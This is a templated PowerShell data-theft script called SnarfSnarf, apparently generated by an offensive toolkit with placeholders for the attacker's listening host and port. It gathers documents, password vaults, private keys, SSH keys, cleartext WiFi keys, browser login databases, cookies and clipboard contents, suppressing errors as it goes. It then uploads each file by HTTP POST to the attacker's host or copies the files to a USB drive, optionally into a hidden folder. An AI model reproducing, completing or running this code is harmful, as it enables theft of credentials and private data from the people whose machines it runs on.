# SnarfSnarf — Windows exfil script (generated by TSK)
# Operator: review before deployment. LHOST={{ lhost }} LPORT={{ lport }}

$ErrorActionPreference = 'SilentlyContinue'
$SnarfStamp = Get-Date -Format 'yyyyMMdd_HHmmss'
$SnarfHost = $env:COMPUTERNAME
$Collected = [System.Collections.Generic.List[string]]::new()

function Add-Files {
    param([string[]]$Paths, [string[]]$Extensions)
    foreach ($root in $Paths) {
        if (-not (Test-Path $root)) { continue }
        Get-ChildItem -Path $root -Recurse -File -ErrorAction SilentlyContinue |
            Where-Object { $Extensions -contains $_.Extension.ToLower() } |
            ForEach-Object { $Collected.Add($_.FullName) }
    }
}

{% if targets.documents %}
Add-Files -Paths @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Downloads"
) -Extensions @('.docx','.pdf','.xlsx','.xls','.txt','.rtf','.csv')
{% endif %}

{% if targets.sensitive %}
Add-Files -Paths @("$env:USERPROFILE", "$env:USERPROFILE\Documents") `
    -Extensions @('.kdbx','.pem','.key','.env','.config','.pfx')
{% endif %}

{% if targets.credentials %}
# WiFi profiles
$wifiOut = "$env:TEMP\snarf_wifi_$SnarfStamp.txt"
netsh wlan export profile key=clear folder=$env:TEMP 2>$null
if (Test-Path $wifiOut) { $Collected.Add($wifiOut) }
# SSH keys
$sshDir = "$env:USERPROFILE\.ssh"
if (Test-Path $sshDir) {
    Get-ChildItem $sshDir -File | ForEach-Object { $Collected.Add($_.FullName) }
}
# Browser credential stores (copy DB files — decryption separate)
$browserPaths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
    "$env:APPDATA\Mozilla\Firefox\Profiles"
)
foreach ($bp in $browserPaths) {
    if (Test-Path $bp) { $Collected.Add($bp) }
}
{% endif %}

{% if targets.browser %}
$browserData = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History",
    "$env:APPDATA\Mozilla\Firefox\Profiles"
)
foreach ($p in $browserData) {
    if (Test-Path $p) { $Collected.Add($p) }
}
{% endif %}

{% if targets.recent %}
$recent = "$env:APPDATA\Microsoft\Windows\Recent"
if (Test-Path $recent) {
    Get-ChildItem $recent -File | ForEach-Object { $Collected.Add($_.FullName) }
}
{% endif %}

{% if targets.clipboard %}
$clipFile = "$env:TEMP\snarf_clipboard_$SnarfStamp.txt"
try {
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.Clipboard]::GetText() | Out-File -FilePath $clipFile -Encoding utf8
    if (Test-Path $clipFile) { $Collected.Add($clipFile) }
} catch {}
{% endif %}

{% for pattern in custom_patterns %}
# Custom: {{ pattern }}
Get-ChildItem -Path "$env:USERPROFILE" -Recurse -Filter "{{ pattern }}" -File -ErrorAction SilentlyContinue |
    Select-Object -First 50 | ForEach-Object { $Collected.Add($_.FullName) }
{% endfor %}

$unique = $Collected | Select-Object -Unique
if ($unique.Count -eq 0) { exit 0 }

{% if output_mode == 'phone_home' %}
$uri = "http://{{ lhost }}:{{ lport }}/api/snarf{% if catch_token %}?ct={{ catch_token }}{% endif %}"
foreach ($file in $unique) {
    try {
        $bytes = [System.IO.File]::ReadAllBytes($file)
        $form = @{
            hostname  = $SnarfHost
            source    = 'snarfsnarf'
            timestamp = $SnarfStamp
            filepath  = $file
            file      = Get-Item -LiteralPath $file
        }
        Invoke-RestMethod -Uri $uri -Method Post -Form $form -ErrorAction Stop
    } catch {}
}
{% else %}
# Find removable USB
$usb = Get-WmiObject Win32_LogicalDisk -ErrorAction SilentlyContinue |
    Where-Object { $_.DriveType -eq 2 } |
    Select-Object -First 1 -ExpandProperty DeviceID
if (-not $usb) { exit 1 }

{% if output_mode == 'usb_hidden' %}
$destRoot = Join-Path $usb '._snarf'
{% else %}
$destRoot = $usb
{% endif %}
$destDir = Join-Path $destRoot "snarf_${SnarfHost}_${SnarfStamp}"
New-Item -ItemType Directory -Path $destDir -Force | Out-Null

foreach ($file in $unique) {
    $rel = $file -replace '[\\:]+', '_'
    $target = Join-Path $destDir $rel
    try { Copy-Item -Path $file -Destination $target -Force -ErrorAction Stop } catch {}
}

{% if zip %}
$zipPath = Join-Path $destRoot "snarf_${SnarfHost}_${SnarfStamp}.zip"
Compress-Archive -Path $destDir -DestinationPath $zipPath -Force
{% endif %}
{% endif %}
